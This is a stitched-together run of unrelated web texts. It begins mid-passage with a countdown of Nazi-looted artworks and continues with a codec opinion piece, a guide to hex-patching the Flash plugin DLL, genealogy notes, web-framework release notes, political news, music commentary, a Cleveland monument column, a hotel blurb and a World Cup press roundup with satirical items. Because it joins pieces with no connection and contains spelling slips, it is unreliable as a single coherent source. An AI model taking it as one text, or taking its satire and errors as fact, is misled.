There are modern heads that may be looked at for a long time , and that may perhaps be looked back on with longing a hundred years later . ”
In the case of the Portrait of Dr. Gachet , the Nazis did n’t steal it from a private collector , but stripped the art from the Städel museum in Frankfort , Germany .
The Städel acquired the portrait in 1911 and it was confiscated in 1937 .
Nazi leader Hermann Göring realized the value of the art , so he decided to sell it and make a profit .
The Portrait of Dr. Gachet was auctioned off and purchased by a German collector who quickly sold the art to Siegfried Kramarsky .
Kramarsky was a Jewish financier that fled to New York in 1938 to escape the Holocaust .
He purchased the art for $ 53,000 .
Today
On May 15 , 1990 , exactly 100 years after the paintings creation , the family of Siegfried Kramarsky sold their copy of the Portrait of Dr. Gachet for $ 82.5 million .
At that time in history , it was the most expensive piece of art ever sold .
It was purchased by Ryoei Saito , who was a Japanese businessman .
Upon Saito ’s death in 1996 , the painting was thought to have been sold , but no information was made available to the public .
Various reports in 2007 claimed that the painting was sold to the Austrian - born investment fund manager Wolfgang Flöttl , but this was never confirmed .
Many questions remain regarding the history of the Portrait of Dr. Gachet .
In this specific case , a Jewish man was able to obtain the stolen art .
If a high powered German , Russian , or American businessman had profited off of the art , I think more people would have taken offense .
The second version of the Portrait of Dr. Gachet is currently in the possession of the Musée d’Orsay , in Paris , France .
7. Portrait of Adele Bloch - Bauer I
Artist : Gustav Klimt
Gustav Klimt was an Austrian born Symbolist painter .
During his lifetime , Klimt created many portraits , murals , and sketches .
The primary subject of his work was usually the female body .
In 1904 , Ferdinand Bloch - Bauer hired Gustav Klimt to create a portrait of his wife Adele .
The work took Klimt three years to complete and the portrait is made of oil and gold on canvas .
Adele Bloch - Bauer died of meningitis in 1925 .
In 1938 , all of Ferdinand Block - Bauer ’s property was put under “ Protective Custody ” by the National Socialist party .
During the war , everything was taken away from Ferdinand and he eventually died in Zürich , Switzerland in November of 1945 .
The will of Ferdinand Block - Bauer ’s made no mention of donating his property to a museum .
After the war , the three living Bloch - Bauer siblings attempted to retain some of the famous paintings from the Austrian government , who were given the pieces of art after Nazi Germany was liberated .
Nothing happened for decades until 1998 when the Austrian government decided that they would return art that had been illegally seized by the Nazis .
However , in order to get the paintings returned , rightful ownership needs to be proved in a court of law , which can be expensive .
In 2006 , the Austrian court ruled that Block - Bauer heir Maria Altmann was the rightful owner of the Portrait of Adele Bloch - Bauer I and four other paintings by Gustav Klimt .
Today
Portraits by Gustav Klimt are extremely rare and valuable .
After regaining the rights to the Portrait of Adele Bloch - Bauer I , Maria Altmann decided to sell it .
In June of 2006 the portrait became the highest selling piece of art up to that point in history .
American businessman Ronald Lauder purchased the painting for $ 135 million and placed it in his Neue Galerie , which is located in New York City .
The Neve Galerie is highly dedicated to pieces of Jewish art that were stolen from the Nazis and recovered .
Ronald Lauder was quoted as saying that the Portrait of Adele Block - Bauer I is his museums “ Mona Lisa . ”
In November of 2006 , the second painting that Gustav Klimt made of Adele Bloch - Bauer ( Adele II ) sold for almost $ 88 million .
Eventually , all five of the Block - Bauer ’s Klimt portraits were sold , with a grand total of approximately $ 325 million .
6. Foundation E.G. Bührle
When researching the history of famous art , it is shocking the amount of paintings that have a large gap in documentation around the time of World War II .
Hundreds of valuable portraits changed hands during the war , but the specifics surrounding the sales are unknown .
This entry will not be examining one specific piece of art , but rather a man named Emil Georg Bührle .
Bührle was a born in Pforzheim , Germany in 1890 and was a German cavalry officer in the Imperial army from 1914 to 1919 .
In the 1920s , Bührle became the CEO of a large company and was moved to Zürich , Switzerland .
Bührle was always interested in art and he started a huge collection during World War II .
He took the opportunity of war to build one of the most prestigious private art galleries in the world .
Today , his museum is known as the Foundation E.G. Bührle and is located in Zürich , Switzerland .
The collection of art at the museum is quite impressive and contains many famous painting and sculptures from Old Masters and Modern artists , including works from Paul Cézanne , Edgar Degas , Paul Gauguin , Édouard Manet , Claude Monet , and Pierre - Auguste Renoir .
You might say that there is no proof that any of these paintings are from stolen victims of the Holocaust .
However , after World War II , Emil Georg Bührle was forced to give back 13 paintings to French - Jewish families who had their property taken away during the war .
A book was put together with a list of artworks reported stolen and Bührle had 13 of them .
The amount of valuable artwork that Bührle obtained at a low price is astonishing .
The art collection housed at the Foundation E.G. Bührle is worth hundreds - of - millions of dollars .
Today
The Foundation E.G. Bührle houses Der Sämann by Vincent van Gogh , Der Selbstmörder by Edouard Manet , Junge Frau by Amedeo Modigliani , and countless other famous works .
On February 10 , 2008 , one of the largest art heists in history took place at the museum .
Armed gunman stormed the museum shortly before closing and stole four famous paintings valued at $ 162.5 million dollars .
The most expensive painting taken was The Boy in the Red Vest by Paul Cézanne , valued at around $ 80 million .
The three other paintings stolen were Count Lepic and His Daughters by Edgar Degas , Poppies near Vétheuil by Claude Monet , and van Gogh ’s Blossoming Chestnut Branches .
To date , the van Gogh and Monet portraits have been recovered , while the other two remain missing .
5. Altarpiece of Veit Stoss
Sculptor : Veit Stoss
Veit Stoss is a famous German sculptor who passed away in 1533 .
His career spanned the transitional period between the late Gothic and the Northern Renaissance style of architecture .
Stoss primarily worked as a wood sculptor .
In the early part of his career he was approached by the people of Kraków , Poland and asked to build a magnificent altarpiece .
He agreed and developed the Altarpiece of Veit Stoss , which is the largest gothic altarpiece in the world .
It measures 13 m high and 11 m wide when the panels are open .
The piece is covered with incredible statue figures , which are more than 12 ft. tall and are carved from the tree trunk of a lime .
Prior to the German invasion of Poland in 1939 , Hitler was well aware of the historic altarpiece and unjustly felt that it was his because Veit Stoss was a German sculptor .
Before the invasion of Poland , the altarpiece was taken apart and hid in various locations .
However , it was still discovered by the Nazis and stolen .
A German unit called the Sonderkommando Paulsen located the crates containing the altarpiece and had the statues and panels shipped to Berlin .
It was kept at Nuremberg Castle .
Today
During the war , many members of the Polish resistance relayed the message that the altarpiece was being held at Nuremberg Castle .
Luckily , it was not significantly damaged during the liberation of Nazi Germany and was recovered by Allied forces .
The Polish National Treasure was immediately returned and in 1957 it was placed in St. Mary ’s Church , Kraków , Poland , where it remains today .
The altarpiece underwent restoration from 1946 - 1949 to fix the structural damage caused by the Nazis .
4. Place de la Concorde
Artist : Edgar Degas
Edgar Degas is considered one of the founders of the Impressionism art movement .
He was a popular French artist that lived predominately during the 19th century .
After the collapse of Nazi Germany , the Red Army was the first to invade Berlin .
During this time , the Soviets discovered hundred of hidden repositories of art .
The Soviet government has been criticized over the years for not reporting many of these discoveries .
In 1991 , it became known that some paintings looted by the Red Army in Germany had been put on display at the Hermitage Museum located in Saint Petersburg , Russia .
After intense pressures , the museum announced in 1994 that they had displayed some pieces of art that had been looted from German private collections .
One should realize that art taken from German homes and underground storage facilities in 1945 consisted of a large amount of stolen goods .
The exhibition “ Hidden Treasures Revealed ” premiered in 1995 at the museum .
It consisted of 74 separate paintings that were displayed for the first time , including the world famous Place de la Concorde by Edgar Degas .
Place de la Concorde was painted by Degas in 1875 .
It depicts the cigar smoking Vicomte Ludovic - Napoléon Lepic , his daughters , and his dog .
It also shows a solitary man in Place de la Concorde in Paris .
Today
Place de la Concorde has always been considered one of Degas signature portraits .
It was thought lost after World War II , but showed up at the Hermitage Museum in 1995 .
The famous painting remains on display at the Hermitage .
Another painting that appeared at the Hermitage in 1995 is the van Gogh masterpiece White House at Night .
White House at Night was also thought to be lost after the war .
It was painted six weeks before van Gogh ’s death .
In December 2004 , another looted work was discovered at the museum , the Venus disarming Mars by Rubens .
The French master Henri Matisse also has many of his early paintings on display at the Hermitage .
During World War II , Matisse ’s paintings were widely distributed and stolen .
Today , they can be found in museums all over the world .
The story of how the Place de la Concorde survived is not documented to the public .

3 . The Astronomer
Artist : Johannes Vermeer
Johannes Vermeer was a Dutch painter who lived from 1632 - 1675 .
During his lifetime , Vermeer was moderately successful and has since become one of the most well known painters of the Baroque period of art .
He tended to paint portraits of domestic middle class life and many of Vermeer ’s paintings were of scientists .
Hitler was a big follower of Johannes Vermeer and made it his ultimate goal to own all of his paintings .
In 1940 , one of Vermeer ’s most cherished works , The Astronomer , was owned by a French man named Edouard de Rothschild .
After the German invasion of France , the painting was stolen by the Nazis .
The Astronomer became one of Hitler ’s prized possessions and was meant to be the focal point of the Führermuseum .
The Führermuseum was a large museum complex that Hitler planned on creating .
It was meant to store and display all of the plundered European art .
A black swastika was stamped on the back of The Astronomer , where it remains today .
Today
The Astronomer was finished by Vermeer around 1668 .
The art was created with oil on canvas , and measures 51 cm x 45 cm .
The painting is linked with another famous Vermeer portrait named The Geographer .
Both paintings are thought to portray the same man , which could be Anton van Leeuwenhoek .
The Astronomer shows incredible detail .
In the painting the book located on the table is turned to a specific page , which is a section that is advising the astronomer to seek “ inspiration from God . ”
In the portrait , the picture on the wall shows the finding of Moses .
After the war ended , The Astronomer was returned to the Rothschild’s .
It was then donated to the famous French museum Louvre in 1982 .
It remains one of the museum ’s most prized possessions .
Vermeer ’s The Geographer had a bit of a different fate .
The Geographer is located at the Städel , which is one of the largest art museums in Germany .
2. Amber Room
Designer : Andreas Schlüter
Andreas Schlüter was German baroque sculptor and architect that lived at the end of the 17th century .
Along with Gottfried Wolfram , who was a Danish amber craftsman , Schlüter was the one that designed the Amber Room .
Construction of the Amber Room began in 1701 and the room was installed at Charlottenburg Palace , home of Friedrich I , the first King of Prussia .
As the name implies , the Amber Room was sculpted out of amber , which is a gemstone made from fossilized tree resin .
The room also contained many jewels , paintings , and gold .
In 1716 , the Amber Room was given to Peter the Great to celebrate peace between Russia and Prussia , and an alliance against Sweden .
In 1755 , Tsarina Elizabeth of Russia had the room transferred to the Catherine Palace , where Frederick II the Great had more amber sent for reconstructions .
Many renovations took place on the Amber Room throughout the 18th century , ultimately measuring 55 square meters and containing over six tones of amber .
During World War II , Hitler was very familiar with the Amber Room and felt that it should be in German possession .
The Nazi army reached the Amber Room after taking control of the city of Leningrad .
Hitler sent a group of men to dismantle the priceless piece of art .
The Soviet army was unable to properly hide the Amber Room because it was crumbling as they tried to dismantle it .
The Nazi army put the Amber Room in 27 separate crates and sent it to Königsberg in East Prussia .
On January 21 , 1945 Hitler ordered the relocation of many pieces of art .
German leader Erich Koch was in charge of the Amber Room and may have decided to move it out of the city .
Later in the war , Königsberg was heavily bombed by the Royal Air Force and the Soviet military .
The Amber Room was never heard from again .
Today
The disappearance of the Amber Room is one of the great mysteries of World War II .
Some reports have claimed that the room survived the war , while others have stated that it was destroyed by bombings or hidden in a lost bunker .
One theory has the Amber Room being loaded onto a German ship or submarine that was sunk by Soviet forces in the Baltic Sea .
Many different groups have been organized over the years in hopes of discovering the lost treasure .
In 2008 , German treasure hunters claimed to have found the Amber Room .
The discovery of an estimated two tons of gold and silver was made , but it was hard to gain access to the site because of deadly booby traps .
The finding was never confirmed to be that of the Amber Room and some reports indicated that clues to the whereabouts of the Amber Room were discovered at the site .
Recently , the Amber Room Organization has announced another discovery that was made in the mountains about 30 miles east of Weimar .
A German ARO spokesman named Henry Hatt has stated that he knows where the Amber Room is hidden .
Apparently , he claims that the treasure was transported to the county of Saalfeld and hidden in an old underground mining chamber .
This story has not been confirmed .
1. Madonna of Bruges
Sculptor : Michelangelo
Michelangelo was an Italian Renaissance painter and sculptor .
He lived from 1475 - 1564 and is most widely known for his sculptures Pietà and David .
In the early 1500s Michelangelo created the masterpiece Madonna of Bruges .
The sculpture is made of marble and is 128 cm in dimension .
Madonna of Bruges is a depiction of Mary with the baby Jesus .
It is noted for being largely unique in comparison to other statues of Mary and Jesus created during the time of Michelangelo .
Most depictions show a smiling Mary looking down on a baby Jesus .
However , in Madonna of Bruges , Mary does n’t cling to Jesus or even look at him .
She has a steady gaze down and away from the child .
It seems that Mary knows the fate of her son .
The sculpture is also notable for being the only Michelangelo work to leave Italy during his lifetime .
It was purchased by a family of wealthy cloth merchants from Bruges .
Bruges is a city located in the northwest corner of Belgium .
The Madonna of Bruges has only been removed from Belgium on two separate incidents in history .
The first came in 1794 , after French Revolutionaries had conquered the Austrian Netherlands .
At that time , Napoleon ordered the people of Bruges to pack up the Madonn and ship it to France .
The sculpture was returned after the defeat of Napoleon .
The second removal occurred in 1944 when German soldiers were retreating from the area .
The soldiers smuggled the Madonna to Germany in a group of mattresses transported by a Red Cross truck .
Two years later the sculpture was found by Allied forces and returned to Bruges .
Today
The Madonna of Bruges is located at the Church of Our Lady in Bruges , Belgium .
It has been kept at the Church of Our Lady since 1514 and this is where the sculpture belongs and will hopefully stay forever .
It is a cherished piece of art and is kept behind a piece of bulletproof glass .
Visitors are also required to stay 15 feet away from the sculpture .
These measures were taken after the 1972 attack on Michelangelo ’s Pietà .
In 1972 , a mentally disturbed geologist named Laszlo Toth attacked the sculpture , which is located at St. Peter ’s Basilica in Vatican City .
Toth took a geologists hammer and bashed the Pietà while screaming “ I am Jesus Christ . ”
It suffered significant damage and many pieces of marble were broken from the statue .
To make things worse , people stole these pieces , which included the nose of Mary .

In January , we had read the various arguments regarding Mozilla ’s decision
not to get an H.264 license .
This has generated a
lot of
discussion
about the future of video on the web .
With Youtube , Dailymotion , Hulu and Vimeo having adopted H.264 for HD video , Mozilla and Opera should use the codecs installed on a user ’s system to determine what the browser can play , rather than force other vendors to adopt Ogg .
Refusing to support a superior codec would be a disservice to your users in years to come .
Why hold back the majority of your users because 2 % of your users are on niche OSes ?
One of the reasons Firefox 1.0 gained traction against IE6 was the many features it had which visibly benefited the end user .
Its pop -up blocker , extensions , and tabs , all gave users a better web experience , which was sorely lacking in IE6 .
When Firefox 1.0 was launched in 2004 , we were n’t told , “ use the experimental 1.5 branch , that one is better than IE6 ” .
At version 1.0 , Firefox was able to gain 10 % of the browser market in one year after its launch as it was simply a better browser .
This brings me to Theora .
Unlike the average Firefox user ( or reviewer ) who can easily demonstrate the many ways Firefox was better than IE6 , reviewers ,
developers and content providers are hard - pressed to demonstrate the benefits of using the the royalty - free Theora .
Few people can demonstrate that Theora is a competitive alternative .
If the same had occurred with Firefox , its uptake would have stalled .
Imagine Firefox having no features that differentiated it from IE6 ; no tabs , no extensions , and no pop - up blocker .
What incentive would users have for trying it ?
Because it was built following W3C standards ?
Because you could view its source code ?
Because it was free to distribute ?
All irrelevant to the average end user .
Theora will not be used on video sharing sites in the next 5 years if its only benefit is that it is royalty - free .
It must earn its space on the content providers ’ harddrive .
It must become better than H.264 ; not ‘ competitive ’ , but better .
Forcing websites to adopt an inferior format will not increase its usage .
If a royalty - free format increases your bandwidth bill , you are not going to use it .
Until engineers at the various video sharing sites can demonstrate that Theora is better than H.264 for daily usage , one - shot demos are not going to convince anyone .
With the rapid adoption of Windows 7 , over 80 % of all personal computers and laptops in the next 5 years will be capable of decoding H.264 content .
The end user will have paid for the decoder .
This provides Mozilla and Opera an easy ‘ back - door ’ to decode H.264 without paying a license fee .
In fact , Opera has done so on Linux , with Mozilla planning on doing something similar for Linux in the future .
For Mozilla to claim that it is looking out for the Linux users in developing nations such as Brazil or Kenya is political posturing , seeing that the majority of Firefox users are on Windows .
Had Mozilla restricted itself to Linux users , it would n’t be earning $ 50 + million / yr or have as much clout in the direction of HTML5 .
How many years have we been reading ‘ this will be the year for Linux on the desktop ’ , yet its active desktop marketshare is still less than 2 % ?
Are we to let 2 % of web users influence the web experience of the remaining 98 % ?
What experience has streaming Theora provided users over the past year ?
Low quality video and crackling sound is the response of leading Theora video sharing site , Dailymotion .
Is it any surprise that Dailymotion also uses H.264 ?
Whether we like it or not , every benchmark has shown that H.264 is earning its harddrive space .
Streaming video on the internet is a business , and businesses are prepared to pay the cost for distributing content .
Until Theora provides the same video quality as H.264 whilst using a fraction of the bandwidth , it will not gain traction .
With the H.264 being used on smartphones , video game consoles , and other internet accessible devices , H.264 is set to be the de facto video standard of the web .
Whilst most users are waiting for an alternative to the patent - encumbered H.264 , Theora 1.0 or 1.1 is sadly not it .
This does not mean that Theora 1.2 + will not be credible alternatives in the coming years , but at the moment it has a long way before it can soundly gain traction amongst video hosts .
Until paying royalties are hurting video hosts ’ pockets moreso than the bandwidth costs of similar quality Theora file , they will continue to use H.264 .
Theora developers have to work on bringing an equivalent of Firefox 1.0 to the IE6 fight and not the Mozilla Suite .
Windows :
With hardware - accelerated Flash 10.1 final now available , it 's a good time to try out some full - screen Hulu or other videos .
But click anywhere else , and the window - filling frame goes away .
Here 's how to keep videos playing full screen using Flash 10.1 .

We 've previously pointed to a fullscreen Flash fix , but the post that covered the fix offered up specific file - copy fixes for particular Flash builds .
Now that Flash has updated to 10.1 final , and is changing rapidly due to security fixes , a more general sense of how to change Flash 's behavior so it does n't close down on clicking elsewhere is called for .
Advertisement
Luckily , Andrew Brampton provides the answer .
His fix requires doing some hacking in a particular configuration file : NPSWF32.dll for most Windows systems , but gcswf32.dll for Chrome users .
And it requires using a hex editor to pin down a particular string and change two values .
G/O Media may get a commission Subscribe and Get Your First Bag Free Promo Code AtlasCoffeeDay20
How do you pull that off ?
First off , download the free XVI32 hex editor .
Once you have it installed , hunt down the file you need to edit , make a copy of it , then drag another copy to the Desktop .
Brampton provides the locations :
On win32 open
C: \Windows \System32 \Macromed \Flash \NPSWF32.dll
On win64 open
C: \Windows \SysWOW64 \Macromed \Flash \NPSWF32.dll or if using Google Chrome ( as Chrome now comes with the Flash plugin ) open
C:\Users\Andrew\AppData\Local\Google\Chrome\Application\6.0.408.1\gcswf32.dll
Advertisement
Now right - click on the .dll file , select " Open With , " tell Windows you 'll " Select from a list " to open it , then point to the XVI32 executable contained in the package you downloaded .
As Brampton explains , the exact two - character code you 'll need to change will differ between Flash versions , but there 's a basic string you can search for .
As of the latest version of Flash for Chrome ( 10.1.53.64 ) , you 'll hit the Search menu and select Find ( or hit Ctrl+ F ) , then search for this string of hex bytes :
74 39 83 E8 07 74 11 83 E8 05 75 13 8B
The 74 and 75 " bytes " will likely always stay the same , and some of the characters between them , but other nearby bytes may change .
Your job is to change the first two bytes in that string ( " 74 39 " in this case ) to " 90 90 " .
Before you try to save your changes , make sure that you 've got a backup copy of the original , and then close down all your browser windows before saving , or you 'll encounter a " sharing " error of some sort .
If you have successfully saved your changes , copy the file back to its original location , then re-launch your browser .
Advertisement
As noted , these specifics will change — the Flash version , and the exact byte string you 're searching for .
Using Brampton 's guide , though , you should be able to update your Flash builds whenever you lose the ability to catch the worthwhile bits from Saturday Night Live while , um , totally working really hard on a Friday .

The court determines that Sam Echols is not a proper person to raise a child , owing to his opinions .
My great - great - grandfather determines that his zeal for the ( Mormon ) faith will be his best revenge .
And that ’s the last mention of Samuel Echols in the pages of The New York Times .
But not the first .
The young Mr. Echols develops into a Mormon preacher and becomes a leading man among dupes from the South .
Georgia is called up to settle the issue as to whether belief in Mormonism is a stain on citizenship or not .
The feeling among the people is to treat Echols roughly if he should win the suit .
Mrs. Echols learns that Mormonism permits the practice of polygamy , refuses to follow her husband to Colorado , and does not see him again until his return to Georgia two years later .
One month later , as The New York Times will report , Samuel has met my great - great - grandmother and taken her to Salt Lake City to be “ sealed unto him . ”
“ He does not practice polygamy . ” 😉
New Elements
Nitrogen 2.x includes great new elements , deployment methods , and improvements to old elements and actions :
Significantly improved support for jQuery Mobile , including mobile - specific elements , allowing you to make adding mobile versions of your application much easier .
The #api{} element allows you to expose a Javascript API that will trigger a postback when called .
You can pass parameters to the function , and then pattern match on the parameters in Erlang .
See the API demo .
The #upload{} element now fires an event when an upload has started , and includes the node ( ) on which the upload is stored , allowing you to handle uploads in an application running on multiple Nitrogen servers .
See the File Upload Demo .
As of version 2.1.0 , The #upload element now support multiple file uploads , progress bars , and even a drag and drop interface .
The #grid{} element provides a Nitrogen interface to the 960 Grid System .
The #template{} element now caches the parsed template , eliminating unnecessary disk hits .
The #restful_form{} element allows you to easily build RESTful forms , allowing for a simpler interface to build forms that will safely degrade if the client does not support Javascript .
The #wizard element allows you to easily build step - by - step multi-page wizards .
Existing elements , including # droppable{} , # sortblock{} , and #upload{} , now allow you to set delegates to go back to a module other than the current page module .
A new #update{} action allows you to wire conditional , client - side update commands , or to broadcast updates across a comet pool , if desired .
This action is also used behind the scenes by APIs such as wf : update / 2 .
The #event{} action now allows you to specify an optional keycode attribute on keydown , keyup , and keypressed events .
j Query Selecters
Commands such as wf : update / 2 and wf : wire / N now understand jQuery selectors as a way of targeting elements .
For example , to apply a # fade{} action to multiple elements , you can do something like this : wf : wire ( " ##myelementid > .image " , # fade{} ) to fade all elements tagged with the ' image ' class underneath the Nitrogen element ' myelementid ' .
See the jQuery Paths Demo and read the Nitrogen Paths docs for more information .
Simplified Element Hierarchy
WASHINGTON — Michael Steele , chairman of the Republican National Committee , drew fierce criticism and a call for his resignation on Friday after declaring at a party fund - raiser that the United States was on the wrong side of history with its conflict in Afghanistan , a military fight he called “ a war of Obama ’s choosing . ”
“ This is not something the United States had actively prosecuted or wanted to engage in , ” Mr. Steele said in a speech Thursday night in Connecticut in which he offered a strong critique of President Obama ’s military strategy .
“ It was the president who was trying to be cute by half by flipping a script demonizing Iraq , while saying the battle really should be Afghanistan , ” Mr. Steele said , according to a video of his remarks that was circulated by Democrats on Friday .
“ Well , if he ’s such a student of history , has he not understood that you know that ’s the one thing you do n’t do , is engage in a land war in Afghanistan ? ”
Mr. Steele , seeking to clarify his remarks , issued a statement on Friday afternoon , saying , “ There is no question that America must win the war on terror . ”

So what makes someone a virtuoso ?
For those who have never trilled a trumpet , it may seem hard to tell .
But in music , as in baseball , it simply takes some exposure to just - great players to appreciate the truly - great .
Four skills I watch in performers are speed , power , acrobatics , and control .
Each person has different strengths , and some matter more to me ( as they will to you ) .
Speed
Glenn Gould in Goldberg Variation Number Five
Canadian pianist Glenn Gould has a rare following due in part to his erudition , his eccentricity , and his quicksilver fingers .
Nobody plays Bach with the precision and insight of Gould .
And also , on such variations as this one , the searing speed .
Power
Sviatoslav Richter in Chopin Etude Opus 10 , Number Four
Richter , a half - German Soviet , is my favorite pianist bar none .
Though he plays this dark , tempestuous tantrum ( almost ) too quickly , you can hear his insane strength in the chords and , oddly , the quieter passages .
My first teacher told me that it takes power to play softly , and Richter shows this is true .
In Chopin , Richter cups the music in his paws like a lion for minutes before seizing it with furious strength .
Acrobatics
Hilary Hahn in Paganini's 24th Caprice
Hilary Hahn has won some crossover appeal and a reputation for lyricism .
What you will see here is not only speed and power , but also her ability to leap with blind accuracy around the fingerboard .
To play like this requires knowing , like a diver perched above the pool , exactly where your finger is going to land .
Or , in the case of phenomenal organist Cameron Carpenter , your feet .
As one violinist I talked to described the feeling , " It 's like crossing a river by leaping between irregular stepping stones — you have to hit them just right or you 'll fall . "
Control
Wynton Marsalis on Carnival of Venice
Compared to the piano's 88 keys and the violin's four strings , the trumpet has only three valves ( buttons ) you can push to alter the sound .
Everything else comes from the performer 's lips , lungs , and who knows what else .
In this barnstorming encore , Wynton Marsalis ( perhaps better known for his jazz works ) , shows off an archetype of the virtuoso as cool , phlegmatic conjurer of demonic sounds .
The last , perhaps hardest kind of bravura to see is related to control .
It 's grace .
The Bach Cello Suites are undeniably demanding .
But the challenge is not to flaunt the difficulty , but to disguise it so the beauty shines through .
( As a pitcher might make a ball appear to have a completely different trajectory . )
Here , the legendary Mstislav Rostropovich makes his cello grieve in the Sarabande from Bach 's fifth suite .
Stay tuned for the fourth part in this series , which will take a narrower look at a single instrument and its role in modern music : the harpsichord .
We want to hear what you think about this article .

A monument stands in the center of downtown Cleveland that mostly goes ignored by the locals but attracts a steady flow of out - of - state tourists .
It 's a monument to war , which may be why the locals mostly tune it out as they hustle toward work , a ball park or any of the scores of attractions that still bring people downtown .
But the Soldiers and Sailors Monument deserves at least a moment for reflection by anyone who gives serious thought to concerns like sacrifice and freedom .
It is a grand monument that in some ways overwhelms Public Square .
It towers over the monuments to city founder Moses Cleaveland and long - ago Mayor Tom Johnson .
Why did a group of prominent Clevelanders feel it necessary in 1894 to dedicate a war monument to the 9,000 Cleveland residents who fought in the Civil War and honor the 1,100 local residents who died in it ?
There were no major battles fought anywhere near Cleveland .
And why did a town that boasted only about 50,000 people around the start of the Civil War send almost a fifth of its population off to war ?
To get an appreciation for these sorts of questions , you have to first enter the monument .
That 's where you will meet veterans Tim Leslie and Bill Tyler .
They are walking war encyclopedias .
As impressive as the monument is from the outside – and there are few , if any , monuments in Cleveland that can rival the Soldiers ' and Sailors ' Monument – you do n't start to grasp the majesty of the architecture until you step inside its memorial room .
" We found that at least 70 percent of the people that live here ( Greater Cleveland ) had no idea that you could enter the place .
They thought it was just a monument , with a column on top of it , " said Leslie , a tour guide , who made a career of the Navy after graduating from East High school .
Printed on the walls of the ornate memorial room are the names , regiments , and ranks of every man from Cleveland who fought in the Civil War .
Many people use the room for genealogy studies .
On a wall facing south is a phenomenal sculpture of a group of women , who are tending to a wounded soldier .
The women called themselves the Sanitation Committee .
They were a precursor to the Red Cross .
And on a wall facing north is my favorite sculpture in all of Cleveland .
A man named Dan Field , a former slave , is seen kneeling before the feet of President Abraham Lincoln .
It is not a subservient pose .
Rather , it 's a powerful pose , one that perfectly captures the intersection of emancipation and resurrection .
In one hand Lincoln holds an empty , unlocked shackle .
In the other he holds a Springfield Rifle , which he is handing to Fields , who was the first black Ohioan to enlist .
Lincoln is granting Field his freedom and a gun .
The gaze in the eyes of Lincoln , as well as in the eyes of the former slave turned soldier , is the gaze of defiant self - sufficiency .
You can't view the sculpture and fail to again recognize that freedom is n't free and that great people are responsible for the freedoms we enjoy today .
The Soldiers and Sailors Monument recently underwent a $ 2 million facelift .
The floors and walls were scrubbed and returned to their original splendor .
New lighting was installed , as was central air conditioning .
The timing is good .
We are a nation at war .
Perspective on the incredible sacrifice demanded of war is often lost on those far removed .
That is the lasting genius of the Soldiers ' and Sailors ' Monument .
It 's a powerful reminder of a nation 's life , a nation 's sacrifice and a nation 's freedom .
The monument is free .
It is open every day except Sunday from 9 a.m. to 4 p.m .
It ’s finally happened !
The $ 5.95 billion Marina Bay Sands Hotel , Singapore finally opened its doors to public in a gala event , and it also managed to dethrone the Emirates Palace Hotel , Abu Dhabi from its position as the world ’s most expensive hotel .
But that ’s not all , the main attraction of the hotel is a 650 ft wide pool perched up at the 55th storey of the magnificent hotel , making it the largest outdoor pool in the world that high .
Called as the Infinity pool , the drop at the edge of the pool spills into a three - tiered catchment which pumps water right back to the main pool !
The hotel also has a boat - shaped ‘ SkyPark ’ on top of the three towers .
The hotel features 2,560 rooms that would cost you $ 520 a night .
Designed by Moshe Safdie , the structure is said to be based on the design resembling a deck of cards .
The hotel décor includes an indoor canal that has Sampan boats to ride in , a casino , an outdoor plaza , a convention centre , a theatre , a crystal pavilion and a lotus flower shaped museum .
The resort will open employment to over 10,000 locals , enough to generate $ 72 m each year .

" Victory ! " screams the front page banner headline of North Korean daily the Pyongyang Democrat , above a report outlining how the Democratic People 's Republic of Korea torpedoed hapless Brazil in a 29 - 0 rout , in which bespectacled man of the match , chairman of the National Defence Commission , general secretary of the Workers ' Party of Korea , supreme leader and midfield general Kim Jong - il scored 28 goals , with his late father eternal president Kim Il - Sung chipping in with a victory - sealing 30 - yard surface - to - air missile in injury - time .
Elsewhere in the Pacific , the New Zealand Herald has taken time out from celebrating their brave boys ' late equaliser against Slovakia to pour scorn on a Sydney Morning Herald headline which they claim was part of a brazen attempt by the Aussies to claim the credit for the All Whites ' well - earned draw .
" Cringing from the still raw memory of their own team 's hiding at the hands of Brazil , the Sydney Morning Herald today ran a story on the All Whites ' 1 - 1 draw with Slovakia under the headline ' Australasia 1 - 1 Slovakia ' , " wrote a slightly confused Herald hack .
" That 's right - apparently New Zealand has ceased to exist and is now part of a country called ' Australasia ' . "
And apparently Germany has ceased to exist and is now part of a country called " Brazil " .
In Wellington and North Island 's Dominion Post scribbler Marc Hinton reports that " All Whites fever has broken out in the All Blacks with New Zealand rugby 's finest well and truly caught up in the exploits of their cross - code cousins in South Africa . "
The Haka - performing muscle - men took time out from plotting Saturday 's humiliation of Wales at Carisbrook to watch Winston Reid , Ryan Nelsen and chums pull off their historic last - gasp moral victory .
" I think probably the whole team watched it , " revealed All Blacks assistant coach Wayne Smith .
" I dozed off at the wrong time , but struggled to stay awake and missed the goal , but I 'll catch it on the replay . "
Asked if he was concerned that the burgeoning popularity of the All Whites might overshadow the efforts of his rugby players , Smith was unconcerned .
" I do n't even think about it , I do n't care about that .
All I care about is the team , the performance and us being proud of ourselves , " said the man who owes football a huge debt of gratitude , considering he would n't even be in a job if William Webb Ellis had n't decided to cheat that time back in 1876 .
Considerably closer to home , under the headline " England : you 're running scared ! " the Sun reports that Clint Dempsey has been banging his gavel and delivering a " damning verdict on Fabio Capello 's men " .
In a series of quotes from which the words ' running ' and ' scared ' are conspicuously absent , the USA man does n't so much deliver a damning verdict as casually observe the blindingly obvious : " Honestly , it seemed during the game that they were dealing with a lot of pressure , " he said .
" They were edgy , there was an edginess to their game but I think they 're a team with quality and they should play with confidence . "
A forlorn looking Robbie Earle features prominently in most of today 's papers after being dismissed from his cushy £ 175,000 - per - year gig as a pundit with ITV1 because 37 tickets he'd bought through ITV1 for family and friends for the Holland v Denmark match fell into the hands of models employed as orange - clad footsoldiers for some beer company 's ambush marketing campaign .
Earle has since denied any wrongdoing , although the Sun suggests he 's " passed on " up to 150 tickets since the start of the tournament .
Not a staggering amount , admittedly , although he'd look very stupid indeed if they were questions on Mastermind .
" Robbie is a smashing bloke but our inquiries quickly established there were other games in which he had passed on tickets , " said an unnamed ITV source .
" We can not say whether any of this was for financial gain .
But Robbie was dismissed with immediate effect . "
The mysterious affair leaves several questions unanswered : 1 ) How popular a bloke must you be to be able to buy 150 tickets for mates who just happen to be in the Soweto area without arousing suspicion and 2 ) why could n't it have been Alan Shearer ?
Away from the World Cup Rafa Benítez used his official unveiling as the new Inter manager to speak out about his sadness at having to leave Liverpool .
" It was not easy - the fans , the Kop have been fantastic , " he said , shortly before sticking the knife in .
" I needed to move , Inter is a massive club , " he said , the tacit suggestion being , of course , that Liverpool is not .
